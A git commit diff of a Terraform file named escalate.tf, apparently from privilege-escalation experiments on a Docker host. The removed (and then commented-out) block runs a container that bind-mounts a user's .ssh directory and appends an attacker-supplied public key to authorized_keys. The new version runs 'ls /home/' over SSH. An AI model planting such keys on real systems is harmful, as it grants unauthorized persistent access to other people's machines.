486bf881e721ec3de2d62c0aaa538ebd08ab94f0
Xander Flood <xander.t.flood@gmail.com>
2020-03-15 00:00:14 -0400

    ls /home

--- escalate.tf
+++ escalate.tf
@@ -2,16 +2,31 @@ variable "escalation_public_key" {
   type = string
 }
 
-resource "docker_container" "ubuntu" {
-  name    = "foo"
-  image   = "alpine:3.11"
-  restart = "no"
+resource "null_resource" "escalate" {
+  connection {
+    type        = "ssh"
+    host        = var.docker_host
+    user        = var.terraform_host_user
+    private_key = base64decode(var.terraform_host_user_key_material)
+  }
 
-  command = ["sh", "-c", "echo \"${var.escalation_public_key}\">> /run/workdir/authorized_keys"]
+  provisioner "remote-exec" {
+    when = create
 
-  mounts {
-    source = "/home/xander/.ssh"
-    target = "/run/workdir"
-    type   = "bind"
+    command = "ls /home/"
   }
 }
+
+# resource "docker_container" "ubuntu" {
+#   name    = "foo"
+#   image   = "alpine:3.11"
+#   restart = "no"
+
+#   command = ["sh", "-c", "echo \"${var.escalation_public_key}\">> /run/workdir/authorized_keys"]
+
+#   mounts {
+#     source = "/home/xander/.ssh"
+#     target = "/run/workdir"
+#     type   = "bind"
+#   }
+# }
